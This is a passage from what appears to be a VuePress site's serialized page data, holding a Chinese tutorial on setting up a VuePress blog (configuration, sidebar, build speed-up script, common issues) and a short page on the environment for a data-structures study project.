大致目录结构\n\nProjectName（例如blog，也可以是xxx-react，只要保证docs是真正的文档入口目录即可）\n  ├── docs\n  │   ├── .vuepress (可选的，用于存放全局的配置、组件、静态资源等)\n  │   │   ├── components (可选的，该目录中的 Vue 组件将会被自动注册为全局组件)\n  │   │   ├── theme (可选的，用于存放本地主题)\n  │   │   │   └── Layout.vue\n  │   │   ├── public (可选的，静态资源目录)\n  │   │   ├── styles (可选的，用于存放样式相关的文件)\n  │   │   │   ├── index.styl (将会被自动应用的全局样式文件，会生成在最终的 CSS 文件结尾，具有比默认样式更高的优先级)\n  │   │   │   └── palette.styl (用于重写默认颜色常量，或者设置新的 stylus 颜色常量)\n  │   │   ├── templates (可选的，谨慎配置，存储 HTML 模板文件)\n  │   │   │   ├── dev.html (用于开发环境的 HTML 模板文件)\n  │   │   │   └── ssr.html (构建时基于 Vue SSR 的 HTML 模板文件)\n  │   │   ├── config.js (可选的，配置文件的入口文件，也可以是 YML 或 toml)\n  │   │   └── enhanceApp.js (可选的，客户端应用的增强)\n  │   ├── book-sketches （自定义博客内容，例如生活部分）\n  │   │       └──_sidebar.md （book-sketches里所有md文件组成的目录）\n  │   ├── book-web （自定义博客内容，例如web部分）\n  │   │       └──_sidebar.md （book-web里所有md文件组成的目录）\n  │   │ \n  │   ├── README.md\n  │   ├── guide\n  │   │   └── README.md\n  │   └── config.md\n  │ \n  └── package.json\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 设置首页\n\n在docs/README.md里加入如下文字，就可以让vuepress将它们渲染成首页（指定home: true）。heroImage的资源需要放到docs/.vuepress/public里。\n\n---\nhome: true\nheroImage: /hero.png\nheroText: Hero 标题\ntagline: Hero 副标题\nactionText: 快速上手 →\nactionLink: /zh/guide/\nfeatures:\n- title: 简洁至上\n  details: 以 Markdown 为中心的项目结构，以最少的配置帮助你专注于写作。\n- title: Vue驱动\n  details: 享受 Vue + webpack 的开发体验，在 Markdown 中使用 Vue 组件，同时可以使用 Vue 来开发自定义主题。\n- title: 高性能\n  details: VuePress 为每个页面预渲染生成静态的 HTML，同时在页面被加载的时候，将作为 SPA 运行。\nfooter: MIT Licensed | Copyright © 2018-present Evan You\n---\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# vuepress的基本配置\n\n页面样式和内容都非常简陋，我们需要稍微对它进行一些配置。在docs/.vuepress下新建一个config.js文件，它就是用来配置我们blog项目的。\n\n可以看官网的常见配置——vuepress默认主题配置。\n\n本人的配置如下：\n\nconst sidebar = require('./sidebar.js');\n\nmodule.exports = {\n    title: 'Liawn\\'s blog',\n    description: '用vuepress搭建的个人博客',\n    base: '/blog-vuepress/',\n    port: 4002,\n    head: [\n        ['meta', {charset: 'UTF-8'}],\n        ['link', { rel: 'icon', href: '/favicon.ico' }], // 增加一个自定义的 favicon(网页标签的图标)\n    ],\n    markdown: {\n        lineNumbers: true, // 代码块显示行号\n        toc: { includeLevel: [2, 3, 4, 5] },\n        // markdown-it插件，解决相对路径中文图片问题\n        extendMarkdown: md => {\n            // yarn add markdown-it-disable-url-encode --dev\n            md.use(require(\"markdown-it-disable-url-encode\"), \"./\");\n        }\n    },\n    plugins: [\n        // yarn add @vuepress/plugin-medium-zoom -D\n        '@vuepress/plugin-medium-zoom',\n        // yarn add vuepress-plugin-fulltext-search -D\n        'fulltext-search'\n    ],\n    theme: 'vuepress-theme-liawn',\n    themeConfig: {\n        sidebarDepth: 0, // 0表示让左侧侧边栏禁止提取文章里的标题\n        lastUpdated: true, // 文档更新时间：每个文件git最后提交的时间。关闭的话可以节约打包时间\n        displayAllHeaders: false, // 默认情况下，侧边栏只会显示由当前活动页面的标题（headers）组成的链接\n        activeHeaderLinks: false, // 当用户通过滚动查看页面的不同部分时，嵌套的标题链接和 URL 中的 Hash 值会实时更新\n        smoothScroll: true, // 启用滚动效果\n        sidebar, // 侧边栏\n        expandAllGroup: false,\n        // 导航栏\n        nav: [\n            { text: 'Web', link: '/book-web/' },\n            { text: '生活', link: '/book-sketches/' },\n        ],\n        rightSidebar: {\n            mode: 'dom',\n            dept: 6,\n            scope: '.page .content__default',\n            navbarHeight: 57.6\n        }\n    },\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 侧边栏\n\nvuepress的侧边栏要比docsify要麻烦很多，但可以自己配置一些参数。大致的sidebar配置如下\n\nmodule.exports = {\n    '/book-web/': [{\n        title: 'web前端',\n        collapsable: false, // 一直展开，不带有折叠功能\n        initialOpenGroupIndex: -1, // 默认是0表示展开第一项，现设置为-1表示初始化时全部折叠\n        children: [{\n            title: '学习JavaScript',\n            path: '/book-web/html、css、js、ts/学习JavaScript/',\n            collapsable: true, // 具有折叠功能\n            children: [\n                '/book-web/html、css、js、ts/学习JavaScript/1.基础语法',\n                '/book-web/html、css、js、ts/学习JavaScript/2.变量、作用域和内存问题'\n            ],\n        }, {\n            title: '学习CSS',\n            collapsable: true,\n            path: '/book-web/html、css、js、ts/学习CSS/',\n            children: [\n                '/book-web/html、css、js、ts/学习CSS/1.选择器'\n            ],\n        },\n        {\n            title: '学习TypeScript',\n            collapsable: true,\n            path: '/book-web/html、css、js、ts/学习TypeScript/',\n            children: [\n                '/book-web/html、css、js、ts/学习TypeScript/1.typescript基础'\n            ],\n        },\n        {\n            title: '学习Vue',\n            collapsable: true,\n            path: '/book-web/web前端js框架/学习Vue/',\n            children: [\n                '/book-web/web前端js框架/学习Vue/1.vue基础'\n            ],\n        }]\n    },\n    {\n        title: '常用工具',\n        collapsable: false,\n        children: [\n            '/book-web/常用工具/Npm的使用',\n            '/book-web/常用工具/Git的使用'\n        ]\n    },\n    {\n        title: '面试准备',\n        collapsable: false,\n        children: [\n            '/book-web/面试准备/WEB前端面试'\n        ]\n    }],\n    // 第二个侧边栏，对应导航栏的第二项\n    '/book-sketches/': [{\n        title: '电脑工具',\n        collapsable: false,\n        children: [\n            '/book-sketches/电脑工具/win10下载与安装'\n        ]\n    }, \n    {\n        title: '日常生活',\n        collapsable: false,\n        children: [\n            '/book-sketches/日常生活/土味情话' \n        ]\n    }]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n如果侧边栏里的每项要加上1.、2.这样的序号（但文章里的标题又不需要1.、2.），可以在文章md最上方加上如下代码（yml形式的title，缺点就是要修改md），当然如果文章里的标题本身就带了1.、2.就可以不用加下面的代码。\n\n---\ntitle: 1.环境搭建\n---\n\n\n1\n2\n3\n\n\n如果不想使用yml来实现的话，可以使用下面另外两种方式（稍微麻烦一点，但是无需修改md）\n\n// 第一种方式就是title+path；第二种方式就是一个数组，第一项就是path，第二项就是title\nmodule.exports = [\n    {\n        title: '1.自定义标题1', // 方式一：title+path，title就是自定义标题\n        path: '/xxx/'\n    },\n    ['/xxx/', '2.自定义标题2'], // 方式二：数组，第一项就是path，第二项就是title\n    'xxx' // 方式三：要么标题本身就带有`1.`、`2.`，或者在md最上方加了yml形式的title（缺点就是要修改md）\n];\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 编译部署\n\nvuepress打包非常慢，可以看feat($core): 改进 VuePress 制作时间、feat($core): 使用 Node 的工作线程提高构建性能、Vuepress 构建太慢了？！\n\n我用的是itsxallwater提供的解决方案\n\n * 在package.json里添加一个新的打包命令：\"new-build\": \"docs/.vuepress/scripts/build.sh\"\n * 具体脚本\n * 将上一步的scripts文件夹复制到docs/.vuepress下\n * build.sh稍做修改（updateBuildScript.js和addWorkerScript.js不变）\n\n#!/bin/sh\ncp docs/.vuepress/scripts/updateBuildScript.js node_modules/@vuepress/core/lib/node/build/index.js\ncp docs/.vuepress/scripts/addWorkerScript.js node_modules/@vuepress/core/lib/node/build/worker.js\nvuepress build docs\n\n\n1\n2\n3\n4\n\n\n运行yarn new-build，打包需要6分钟左右（如果不使用以上解决方案，我试过至少需要12h）。打包好的内容在docs/.vuepress/dist，在它部署到GiteePages或者GithubPages上。\n\n\n\n\n# 常见问题\n\n 1. 中文图片路径问题\n    \n    * 要使用markdown-it-disable-url-encode插件。\n    \n    * 先yarn add markdown-it-disable-url-encode --dev，然后在docs/.vuepress/config.js加入如下代码：\n      \n      module.exports = {\n          markdown: {\n              // markdown-it插件，解决相对路径中文图片问题\n              extendMarkdown: md => {\n                  md.use(require(\"markdown-it-disable-url-encode\"), \"./\");\n              }\n          },\n      }\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n    \n    * 具体参考Vuepress 图片资源中文路径问题\n\n 2. markdown中的花括号和Vue的插值冲突问题\n    \n    ::: v-pre\n    `{{ xxx }}`\n    :::\n    \n    \n    1\n    2\n    3\n    \n\n 3. window、document不能使用的问题。\n\n * 浏览器的 API 访问限制\n * document有其他解决访问，如this.$root.$el或this.$parent.$el",normalizedContent:"# 使用vuepress写blog\n\n\n# 为什么使用vuepress\n\nvuepress是vue前端框架团队推出的一款静态网站生成器，它的优势就在于它是vue官方背书。即使是docsify它也是使用的vue技术，所以我们何不直接使用vuepress呢。还有docsify是运行时驱动，而vuepress提前生成静态内容，在seo上会好一些。\n\n\n# vuepress的安装\n\n * npm的使用：首先得会使用npm，查看之前写的“npm的使用”。\n\n * vuepress官网：可以跟着vuepress官网来学习使用。\n\n * 初始化项目：准备一个新项目的空文件夹（也可以对现有项目的docs进行改造，记得先备份docs里的内容），在空文件夹下使用npm init（yarn init）来初始化blog项目（需要上传代码可以使用git init）。\n\n * 安装vuepress：在新项目下（或者现有项目docs的根目录下），运行npm install -d vuepress（yarn add -d vuepress）局部安装vuepress，再编辑package.json的scripts如下。\n   \n   {\n       // 添加npm运行脚本\n       \"scripts\": {\n           \"dev\": \"vuepress dev docs\",\n           \"build\": \"vuepress build docs\"\n       },\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * 预览项目：运行npm run dev，打开http://localhost:8080/，如果发现404问题，可以在项目的docs下新建一个readme.md，docs就是存放博客的地方，它的readme.md会成为根路由的渲染页面。\n\n * 新增.gitignore：在这个.gitignore文件里添加node_modules、.git、.vscode、.temp、.cache等。\n\n * 迁移博客：在初始化时提过如果是迁移就新建分支，并清空所有内容。原因是docs文件夹里如果存有之前的博客内容，那么vuepress可能会编译报错，就需要先将这些博客内容暂时剪切到外面，等下一小节配置的时候再移进来慢慢修改。\n\n\n# 大致目录结构\n\nprojectname（例如blog，也可以是xxx-react，只要保证docs是真正的文档入口目录即可）\n  ├── docs\n  │   ├── .vuepress (可选的，用于存放全局的配置、组件、静态资源等)\n  │   │   ├── components (可选的，该目录中的 vue 组件将会被自动注册为全局组件)\n  │   │   ├── theme (可选的，用于存放本地主题)\n  │   │   │   └── layout.vue\n  │   │   ├── public (可选的，静态资源目录)\n  │   │   ├── styles (可选的，用于存放样式相关的文件)\n  │   │   │   ├── index.styl (将会被自动应用的全局样式文件，会生成在最终的 css 文件结尾，具有比默认样式更高的优先级)\n  │   │   │   └── palette.styl (用于重写默认颜色常量，或者设置新的 stylus 颜色常量)\n  │   │   ├── templates (可选的，谨慎配置，存储 html 模板文件)\n  │   │   │   ├── dev.html (用于开发环境的 html 模板文件)\n  │   │   │   └── ssr.html (构建时基于 vue ssr 的 html 模板文件)\n  │   │   ├── config.js (可选的，配置文件的入口文件，也可以是 yml 或 toml)\n  │   │   └── enhanceapp.js (可选的，客户端应用的增强)\n  │   ├── book-sketches （自定义博客内容，例如生活部分）\n  │   │       └──_sidebar.md （book-sketches里所有md文件组成的目录）\n  │   ├── book-web （自定义博客内容，例如web部分）\n  │   │       └──_sidebar.md （book-web里所有md文件组成的目录）\n  │   │ \n  │   ├── readme.md\n  │   ├── guide\n  │   │   └── readme.md\n  │   └── config.md\n  │ \n  └── package.json\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 设置首页\n\n在docs/readme.md里加入如下文字，就可以让vuepress将它们渲染成首页（指定home: true）。heroimage的资源需要放到docs/.vuepress/public里。\n\n---\nhome: true\nheroimage: /hero.png\nherotext: hero 标题\ntagline: hero 副标题\nactiontext: 快速上手 →\nactionlink: /zh/guide/\nfeatures:\n- title: 简洁至上\n  details: 以 markdown 为中心的项目结构，以最少的配置帮助你专注于写作。\n- title: vue驱动\n  details: 享受 vue + webpack 的开发体验，在 markdown 中使用 vue 组件，同时可以使用 vue 来开发自定义主题。\n- title: 高性能\n  details: vuepress 为每个页面预渲染生成静态的 html，同时在页面被加载的时候，将作为 spa 运行。\nfooter: mit licensed | copyright © 2018-present evan you\n---\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# vuepress的基本配置\n\n页面样式和内容都非常简陋，我们需要稍微对它进行一些配置。在docs/.vuepress下新建一个config.js文件，它就是用来配置我们blog项目的。\n\n可以看官网的常见配置——vuepress默认主题配置。\n\n本人的配置如下：\n\nconst sidebar = require('./sidebar.js');\n\nmodule.exports = {\n    title: 'liawn\\'s blog',\n    description: '用vuepress搭建的个人博客',\n    base: '/blog-vuepress/',\n    port: 4002,\n    head: [\n        ['meta', {charset: 'utf-8'}],\n        ['link', { rel: 'icon', href: '/favicon.ico' }], // 增加一个自定义的 favicon(网页标签的图标)\n    ],\n    markdown: {\n        linenumbers: true, // 代码块显示行号\n        toc: { includelevel: [2, 3, 4, 5] },\n        // markdown-it插件，解决相对路径中文图片问题\n        extendmarkdown: md => {\n            // yarn add markdown-it-disable-url-encode --dev\n            md.use(require(\"markdown-it-disable-url-encode\"), \"./\");\n        }\n    },\n    plugins: [\n        // yarn add @vuepress/plugin-medium-zoom -d\n        '@vuepress/plugin-medium-zoom',\n        // yarn add vuepress-plugin-fulltext-search -d\n        'fulltext-search'\n    ],\n    theme: 'vuepress-theme-liawn',\n    themeconfig: {\n        sidebardepth: 0, // 0表示让左侧侧边栏禁止提取文章里的标题\n        lastupdated: true, // 文档更新时间：每个文件git最后提交的时间。关闭的话可以节约打包时间\n        displayallheaders: false, // 默认情况下，侧边栏只会显示由当前活动页面的标题（headers）组成的链接\n        activeheaderlinks: false, // 当用户通过滚动查看页面的不同部分时，嵌套的标题链接和 url 中的 hash 值会实时更新\n        smoothscroll: true, // 启用滚动效果\n        sidebar, // 侧边栏\n        expandallgroup: false,\n        // 导航栏\n        nav: [\n            { text: 'web', link: '/book-web/' },\n            { text: '生活', link: '/book-sketches/' },\n        ],\n        rightsidebar: {\n            mode: 'dom',\n            dept: 6,\n            scope: '.page .content__default',\n            navbarheight: 57.6\n        }\n    },\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 侧边栏\n\nvuepress的侧边栏要比docsify要麻烦很多，但可以自己配置一些参数。大致的sidebar配置如下\n\nmodule.exports = {\n    '/book-web/': [{\n        title: 'web前端',\n        collapsable: false, // 一直展开，不带有折叠功能\n        initialopengroupindex: -1, // 默认是0表示展开第一项，现设置为-1表示初始化时全部折叠\n        children: [{\n            title: '学习javascript',\n            path: '/book-web/html、css、js、ts/学习javascript/',\n            collapsable: true, // 具有折叠功能\n            children: [\n                '/book-web/html、css、js、ts/学习javascript/1.基础语法',\n                '/book-web/html、css、js、ts/学习javascript/2.变量、作用域和内存问题'\n            ],\n        }, {\n            title: '学习css',\n            collapsable: true,\n            path: '/book-web/html、css、js、ts/学习css/',\n            children: [\n                '/book-web/html、css、js、ts/学习css/1.选择器'\n            ],\n        },\n        {\n            title: '学习typescript',\n            collapsable: true,\n            path: '/book-web/html、css、js、ts/学习typescript/',\n            children: [\n                '/book-web/html、css、js、ts/学习typescript/1.typescript基础'\n            ],\n        },\n        {\n            title: '学习vue',\n            collapsable: true,\n            path: '/book-web/web前端js框架/学习vue/',\n            children: [\n                '/book-web/web前端js框架/学习vue/1.vue基础'\n            ],\n        }]\n    },\n    {\n        title: '常用工具',\n        collapsable: false,\n        children: [\n            '/book-web/常用工具/npm的使用',\n            '/book-web/常用工具/git的使用'\n        ]\n    },\n    {\n        title: '面试准备',\n        collapsable: false,\n        children: [\n            '/book-web/面试准备/web前端面试'\n        ]\n    }],\n    // 第二个侧边栏，对应导航栏的第二项\n    '/book-sketches/': [{\n        title: '电脑工具',\n        collapsable: false,\n        children: [\n            '/book-sketches/电脑工具/win10下载与安装'\n        ]\n    }, \n    {\n        title: '日常生活',\n        collapsable: false,\n        children: [\n            '/book-sketches/日常生活/土味情话' \n        ]\n    }]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n如果侧边栏里的每项要加上1.、2.这样的序号（但文章里的标题又不需要1.、2.），可以在文章md最上方加上如下代码（yml形式的title，缺点就是要修改md），当然如果文章里的标题本身就带了1.、2.就可以不用加下面的代码。\n\n---\ntitle: 1.环境搭建\n---\n\n\n1\n2\n3\n\n\n如果不想使用yml来实现的话，可以使用下面另外两种方式（稍微麻烦一点，但是无需修改md）\n\n// 第一种方式就是title+path；第二种方式就是一个数组，第一项就是path，第二项就是title\nmodule.exports = [\n    {\n        title: '1.自定义标题1', // 方式一：title+path，title就是自定义标题\n        path: '/xxx/'\n    },\n    ['/xxx/', '2.自定义标题2'], // 方式二：数组，第一项就是path，第二项就是title\n    'xxx' // 方式三：要么标题本身就带有`1.`、`2.`，或者在md最上方加了yml形式的title（缺点就是要修改md）\n];\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 编译部署\n\nvuepress打包非常慢，可以看feat($core): 改进 vuepress 制作时间、feat($core): 使用 node 的工作线程提高构建性能、vuepress 构建太慢了？！\n\n我用的是itsxallwater提供的解决方案\n\n * 在package.json里添加一个新的打包命令：\"new-build\": \"docs/.vuepress/scripts/build.sh\"\n * 具体脚本\n * 将上一步的scripts文件夹复制到docs/.vuepress下\n * build.sh稍做修改（updatebuildscript.js和addworkerscript.js不变）\n\n#!/bin/sh\ncp docs/.vuepress/scripts/updatebuildscript.js node_modules/@vuepress/core/lib/node/build/index.js\ncp docs/.vuepress/scripts/addworkerscript.js node_modules/@vuepress/core/lib/node/build/worker.js\nvuepress build docs\n\n\n1\n2\n3\n4\n\n\n运行yarn new-build，打包需要6分钟左右（如果不使用以上解决方案，我试过至少需要12h）。打包好的内容在docs/.vuepress/dist，在它部署到giteepages或者githubpages上。\n\n\n\n\n# 常见问题\n\n 1. 中文图片路径问题\n    \n    * 要使用markdown-it-disable-url-encode插件。\n    \n    * 先yarn add markdown-it-disable-url-encode --dev，然后在docs/.vuepress/config.js加入如下代码：\n      \n      module.exports = {\n          markdown: {\n              // markdown-it插件，解决相对路径中文图片问题\n              extendmarkdown: md => {\n                  md.use(require(\"markdown-it-disable-url-encode\"), \"./\");\n              }\n          },\n      }\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n    \n    * 具体参考vuepress 图片资源中文路径问题\n\n 2. markdown中的花括号和vue的插值冲突问题\n    \n    ::: v-pre\n    `{{ xxx }}`\n    :::\n    \n    \n    1\n    2\n    3\n    \n\n 3. window、document不能使用的问题。\n\n * 浏览器的 api 访问限制\n * document有其他解决访问，如this.$root.$el或this.$parent.$el",charsets:{cjk:!0}},{title:"1.环境搭建",frontmatter:{title:"1.环境搭建"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"book-web/数据结构与算法/1.环境搭建.md",key:"v-df549c9e",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",headers:[{level:2,title:"背景",slug:"背景",normalizedTitle:"背景",charIndex:11},{level:2,title:"数据结构的简单分类",slug:"数据结构的简单分类",normalizedTitle:"数据结构的简单分类",charIndex:400},{level:2,title:"使用TypeScript",slug:"使用typescript",normalizedTitle:"使用typescript",charIndex:663},{level:2,title:"环境搭建详情",slug:"环境搭建详情",normalizedTitle:"环境搭建详情",charIndex:905},{level:3,title:"环境和开发工具",slug:"环境和开发工具",normalizedTitle:"环境和开发工具",charIndex:916},{level:3,title:"测试与调试工具",slug:"测试与调试工具",normalizedTitle:"测试与调试工具",charIndex:1026},{level:3,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:465}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"背景 数据结构的简单分类 使用TypeScript 环境搭建详情 环境和开发工具 测试与调试工具 其他",content:"# 环境搭建\n\n\n# 背景\n\n>     JavaScript是最流行的编程语言之一，它不仅可以用于前端开发，也适用于后端开发（Node.js）。JavaScript同样也可用于移动领域和桌面端应用，甚至你在嵌入式设备以及物联网设备都能使用它。正如你看到的，到处都有JavaScript的身影。——《学习JavaScript数据结构与算法》\n> \n>     数据结构是计算机存储、组织数据的方式。数据结构是指相互之间存在一种或多种特定关系的数据元素的集合。通常情况下，精心选择的数据结构可以带来更高的运行或者存储效率。数据结构往往同高效的检索算法和索引技术有关。——百度百科《数据结构》\n> \n>     数据的逻辑结构和物理结构是数据结构的两个密切相关的方面，同一逻辑结构可以对应不同的存储结构。算法的设计取决于数据的逻辑结构，而算法的实现依赖于指定的存储结构。——百度百科《数据结构》\n\n\n# 数据结构的简单分类\n\n    按照数据的逻辑结构可分为线性结构和非线性结构。稍微复杂一点可分为集合、线性结构、树形结构、图形结构、其他结构。\n    1.集合：元素之间除了“同属一个集合” 的相互关系外，别无其他关系。\n    2.线性结构：元素存在一对一的相互关系（元素有唯一的前驱和后继）。\n    3.树形结构：元素存在一对多的相互关系。\n    4.图形结构：元素存在多对多的相互关系。\n    5.其他结构：聚合数据类型等。\n\n    后面再展开说明这些具体类型下的数据类型，并且用代码实现他们的基本功能。\n\n\n# 使用TypeScript\n\n>     TypeScript是一个开源的、渐进式包含类型的JavaScript超集，由微软创建并维护。创建它的目的是让开发者增强JavaScript的能力并应用的规模扩展变得更容易。它的主要功能之一是为JavaScript变量提供类型支持。在JavaScript中提供类型支持可以实现静态检查，从而更容易地重构代码和寻找bug。最后，TypeScript会被编译为简单的JavaScript代码。——《学习JavaScript数据结构与算法》\n\n\n# 环境搭建详情\n\n\n# 环境和开发工具\n\n    使用Node.js作为运行环境，Npm作为相关包管理工具，Git作为代码管理管局、VSCode作为代码编辑环境；具体教程可以看之前有写过Npm的使用、Git的使用、VSCode的使用。\n\n\n# 测试与调试工具\n\n    使用mocha和chai进行单元测试，用mochawesome和nyc生成测试报告（含覆盖率）。mocha和chai的使用可以参考我之前写的“基于mocha+chai的单元测试”，当然也可以参考其他人的测试配置。\n\n    代码调试很重要，具体配置在项目的.vscode/launch.json下查看。在使用Mocha跑xxx.spec.ts测试代码时，可以在代码上打断点，在代码上查看变量数值等等，和浏览器调试是一样的。\n\n\n# 其他\n\n    并没有考虑要生成js文件，也没有考虑做压缩混淆处理，所以没有使用到打包编译工具；其他的一些配置具体可查看项目中的package.json、tsconfig.json、tslint.json、.gitignore、launch.json等。\n\n    项目初始化的相关命令是 git init、git clone xxx、npm init、npm install，还要叮嘱一句，项目报错的话可能是你的npm包有问题，在下载项目中依赖的npm包这样会很慢但是你要耐心等待，如果你要使用淘宝镜像可能会遇到“npm包不同步”的问题，使用yarn也是一个不错的选择。",normalizedContent:"# 环境搭建\n\n\n# 背景\n\n>     javascript是最流行的编程语言之一，它不仅可以用于前端开发，也适用于后端开发（node.js）。javascript同样也可用于移动领域和桌面端应用，甚至你在嵌入式设备以及物联网设备都能使用它。正如你看到的，到处都有javascript的身影。——《学习javascript数据结构与算法》\n> \n>     数据结构是计算机存储、组织数据的方式。数据结构是指相互之间存在一种或多种特定关系的数据元素的集合。通常情况下，精心选择的数据结构可以带来更高的运行或者存储效率。数据结构往往同高效的检索算法和索引技术有关。——百度百科《数据结构》\n> \n>     数据的逻辑结构和物理结构是数据结构的两个密切相关的方面，同一逻辑结构可以对应不同的存储结构。算法的设计取决于数据的逻辑结构，而算法的实现依赖于指定的存储结构。——百度百科《数据结构》\n\n\n# 数据结构的简单分类\n\n    按照数据的逻辑结构可分为线性结构和非线性结构。稍微复杂一点可分为集合、线性结构、树形结构、图形结构、其他结构。\n    1.集合：元素之间除了“同属一个集合” 的相互关系外，别无其他关系。\n    2.线性结构：元素存在一对一的相互关系（元素有唯一的前驱和后继）。\n    3.树形结构：元素存在一对多的相互关系。\n    4.图形结构：元素存在多对多的相互关系。\n    5.其他结构：聚合数据类型等。\n\n    后面再展开说明这些具体类型下的数据类型，并且用代码实现他们的基本功能。\n\n\n# 使用typescript\n\n>     typescript是一个开源的、渐进式包含类型的javascript超集，由微软创建并维护。创建它的目的是让开发者增强javascript的能力并应用的规模扩展变得更容易。它的主要功能之一是为javascript变量提供类型支持。在javascript中提供类型支持可以实现静态检查，从而更容易地重构代码和寻找bug。最后，typescript会被编译为简单的javascript代码。——《学习javascript数据结构与算法》\n\n\n# 环境搭建详情\n\n\n# 环境和开发工具\n\n    使用node.js作为运行环境，npm作为相关包管理工具，git作为代码管理管局、vscode作为代码编辑环境；具体教程可以看之前有写过npm的使用、git的使用、vscode的使用。\n\n\n# 测试与调试工具\n\n    使用mocha和chai进行单元测试，用mochawesome和nyc生成测试报告（含覆盖率）。mocha和chai的使用可以参考我之前写的“基于mocha+chai的单元测试”，当然也可以参考其他人的测试配置。\n\n    代码调试很重要，具体配置在项目的.vscode/launch.json下查看。在使用mocha跑xxx.spec.ts测试代码时，可以在代码上打断点，在代码上查看变量数值等等，和浏览器调试是一样的。\n\n\n# 其他\n\n    并没有考虑要生成js文件，也没有考虑做压缩混淆处理，所以没有使用到打包编译工具；其他的一些配置具体可查看项目中的package.json、tsconfig.json、tslint.json、.gitignore、launch.json等。\n\n    项目初始化的相关命令是 git init、git clone xxx、npm init、npm install，还要叮嘱一句，项目报错的话可能是你的npm包有问题，在下载项目中依赖的npm包这样会很慢但是你要耐心等待，如果你要使用淘宝镜像可能会遇到“npm包不同步”的问题，使用yarn也是一个不错的选择。",charsets:{cjk:!0}},{title:"10.图",frontmatter:{title:"10.图"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/10.%E5%9B%BE.html",relativePath:"book-web/数据结构与算法/10.图.md",key:"v-4b430b61",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/10.%E5%9B%BE.html",headers:[{level:2,title:"图的相关术语",slug:"图的相关术语",normalizedTitle:"图的相关术语",charIndex:8},{level:2,title:"图的表示",slug:"图的表示",normalizedTitle:"图的表示",charIndex:706},{level:2,title:"图的实现",slug:"图的实现",normalizedTitle:"图的实现",charIndex:916},{level:2,title:"图的遍历",slug:"图的遍历",normalizedTitle:"图的遍历",charIndex:1793},{level:3,title:"广度优先搜索",slug:"广度优先搜索",normalizedTitle:"广度优先搜索",charIndex:1996},{level:3,title:"深度优先搜索",slug:"深度优先搜索",normalizedTitle:"深度优先搜索",charIndex:2010},{level:2,title:"最短路径算法",slug:"最短路径算法",normalizedTitle:"最短路径算法",charIndex:3108},{level:3,title:"迪杰斯特拉(Dijkstra)算法",slug:"迪杰斯特拉-dijkstra-算法",normalizedTitle:"迪杰斯特拉(dijkstra)算法",charIndex:3119},{level:3,title:"弗洛伊德(Floyd)算法",slug:"弗洛伊德-floyd-算法",normalizedTitle:"弗洛伊德(floyd)算法",charIndex:3602},{level:2,title:"最小生成树",slug:"最小生成树",normalizedTitle:"最小生成树",charIndex:3783},{level:3,title:"普里姆(Prim)算法",slug:"普里姆-prim-算法",normalizedTitle:"普里姆(prim)算法",charIndex:3911},{level:3,title:"克鲁斯卡尔(Kruskal)算法",slug:"克鲁斯卡尔-kruskal-算法",normalizedTitle:"克鲁斯卡尔(kruskal)算法",charIndex:4097}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"图的相关术语 图的表示 图的实现 图的遍历 广度优先搜索 深度优先搜索 最短路径算法 迪杰斯特拉(Dijkstra)算法 弗洛伊德(Floyd)算法 最小生成树 普里姆(Prim)算法 克鲁斯卡尔(Kruskal)算法",content:"# 图\n\n\n# 图的相关术语\n\n    